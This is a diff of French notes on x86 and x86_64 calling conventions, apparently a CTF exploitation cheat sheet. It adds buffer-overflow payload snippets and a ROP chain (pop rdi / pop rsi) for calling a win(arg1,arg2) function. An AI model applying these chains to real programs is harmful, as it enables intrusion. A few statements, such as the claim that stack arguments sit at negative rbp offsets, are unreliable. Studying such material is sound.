@@ -86,17 +86,21 @@ Exemple:
 
 ## Calling conventions
 
+Les variables locales sont toujours à offset négatif (i.e `rbp-0xn`).
+Les arguments sont à offset positif (i.e `ebp+0xn` ) en x86. Ils sont passés par les registres jusqu'au 6ème puis à puis push (offset négatif `rbp-0xn`) à partir du 7ème en x86_64.
+
 ### 32 vs 64 bits (x86)
+
+#### x86
 
 - https://beta.hackndo.com/conventions-d-appel/
 - https://en.wikipedia.org/wiki/X86_calling_conventions
 - https://blog.devgenius.io/understanding-the-stack-a-precursor-to-exploiting-buffer-overflow-8c6972fdb4ac
 
 En 32 bits, tous les paramètres sont poussés vers la pile **dans l'ordre inverse** avant que la fonction ne soit appelée (STDCALL).
-En 64 bits, cependant, les 6 premiers sont stockés dans les registres RDI, RSI, RDX, RCX, R8 et R9 respectivement selon la convention d'appel (FASTCALL, dépend de l'OS).
 E.G pour `maFonctionTest(1,2,3)` :
 
-```
+```asm
 ; .text
 pushl $3 ; pousse la constante 3, d'où le symbole $
 pushl $2 ; idem
@@ -105,8 +109,15 @@ call 0xcafebabe ; appel de maFonctionTest
 add %esp, 0xc ; dépile 0xc = 12 bytes - l'épilogue peut se faire dans callee ou caller (ici) selon la convention
 ```
 
-32 bits: on ecrase le ret et la stack frame suivante
-64 bits: on appelle system() directement
+#### x86_64
+
+En 64 bits, cependant, les 6 premiers sont stockés dans les registres RDI, RSI, RDX, RCX, R8 et R9 respectivement selon la convention d'appel (FASTCALL, dépend de l'OS).
+
+```asm
+mov     esi, 0          ; buf stdin
+mov     rdi, rax        ; stream
+call    _setbuf			; _setbuf(buf,stream)
+```
 
 ### Calling win(arg1,arg2) on x86 and x64
 
@@ -119,12 +130,29 @@ add %esp, 0xc ; dépile 0xc = 12 bytes - l'épilogue peut se faire dans callee o
 # x86
 payload = b"\x90" * offset
 payload += p32(win)
-## WE ALREADY ARE ON THE STACK
-## fake return address for win
+## we already are on the stack
+
+## call win ; push eip_main = fake return address for win
 payload += p32(0x12345678)
+
 ## no push in reverse order => values in order
 payload += p32(arg1)
 payload += p32(arg2)
+
+#stack after overflow:
+#------
+#&win	 <- RIP
+#fake_ret
+#arg1
+#arg2
+#------
+#
+#x86 equivalent:
+#push arg2
+#push arg1
+#;call win
+#push fake_ret
+#jmp eip	;win(arg1,arg2)
 ```
 
 ```python
@@ -137,6 +165,29 @@ payload += p64(arg2)			# value into rsi -> first param
 payload += p64(0x0)				# value into r15 -> not important
 payload += p64(win)
 payload += p64(0x0)
+
+#registers after overflow:
+#rdi = arg1
+#rsi = arg2
+#r15 = 0 ; not important
+#
+#stack after overflow:
+#------
+#POP_RDI <- RIP
+#arg1	; popped into rdi
+#POP_RSI_R15
+#arg2	; popped into rsi
+#0		; popped into r15
+#win	; win(rdi,rsi)
+#0
+#------
+#
+#x86_64 equivalent:
+#
+#mov rdi, arg1
+#mov rsi, arg2
+#mov r15, 0
+#call win ; win(rdi,rsi)
 ```
 
 ### Alignement & x64 MOVABS Issue
